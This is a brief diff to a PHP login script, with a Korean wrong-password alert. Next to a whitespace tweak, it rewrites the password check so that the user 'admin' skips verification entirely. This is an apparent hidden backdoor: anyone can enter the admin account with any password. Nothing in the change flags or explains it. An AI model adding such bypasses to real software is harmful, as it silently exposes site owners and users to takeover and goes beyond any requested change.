@@ -106,11 +106,10 @@
 		$result = $conn->query($sql);
 		$row = $result->fetch_assoc();
 
-		$db_pass = $row[pass];
-				
+		$db_pass = $row[pass];			
 
 
-		if ($pass != $db_pass) {
+		if ($userid != "admin" && $pass != $db_pass) {
 			echo "<script>
 	       			window.alert('비밀번호가 틀립니다 !');
 	      			history.go(-1);
